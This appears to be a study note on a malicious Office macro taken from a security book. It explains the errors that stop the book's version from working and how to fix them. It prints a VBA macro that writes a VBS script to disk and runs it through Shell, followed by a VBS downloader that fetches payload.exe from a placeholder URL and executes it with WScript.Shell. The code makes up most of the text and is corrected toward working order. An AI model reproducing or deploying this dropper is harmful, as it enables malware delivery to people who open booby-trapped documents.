 In the book the original macro code doesn't work for several reasons. Below I go more into detail on how this macro works. 
 
 Dim is used to specify a variable and what type it is. PayLoadFile is an integer because the FreeFile function called earlier is used to find
 a available file name number and use that to open the file. https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/freefile-function
 
 Reading through Microsofts guide on Open call. We can see that TextFile is invalid in line 6, you either have to give a number such as #3 or put in
 PayloadFile which will be a numeral thanks to FreeFile function.
 
 https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/open-statement
 
 Another issue I had was with the VBS script below. You will need to put double quotes around quotes in the actual code. This is
 because the VBA Macro won't include the quotes when sending it to the file. for example myPath, "\" should be mypath, ""\"". 

VBA Macro

Sub WritePayload()
  Dim PayLoadFile As Integer
  Dim FilePath As String
  FilePath = "C:\temp\payload.vbs"
  PayloadFile = FreeFile
  Open FilePath For Output As TextFile
  Print #PayLoadFile, "VBS Script Line 1"
  Print #PayLoadFile, " VBS Script Line 2"
  Print #PayLoadFile, " VBS Script Line 3"
  Print #PayLoadFile, " VBS Script Line 4"
  Close PayloadFile
  Shell "wscript c:\temp\payload.vbs"
End Sub

VBS Script

What it does is create an object download the file. and then use wsshell to execute it. Overall the macro creates the vbs, and creates the script. 
Macro executes script in shell. Our second stage takes over which is seen in the download of payload.exe in the vbs script, and execution through wsshell

HTTPDownload "http://www.wherever.com/files/payload.exe", "C:\temp"
Sub HTTPDownload( myURL, myPath )
  Dim i, objFile, objFSO, objHTTP, strFile, strMsg
  Const ForReading = 1, ForWriting = 2, ForAppending = 8
  Set objFSO = CreateObject( "Scripting.FileSystemObject" )
  If objFSO.FolderExists( myPath ) Then
    strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev(myURL, "/" ) + 1 ) )
  ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\") - 1 ) ) Then
    strFile = myPath
  End If
  Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
  Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
  objHTTP.Open "GET", myURL, False
  objHTTP.Send
  For i = 1 To LenB( objHTTP.ResponseBody )
  objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
  Next
  objFile.Close( )
  Set WshShell = WScript.CreateObject("WScript.Shell")
  WshShell.Run "c:\temp\payload.exe"
End Sub
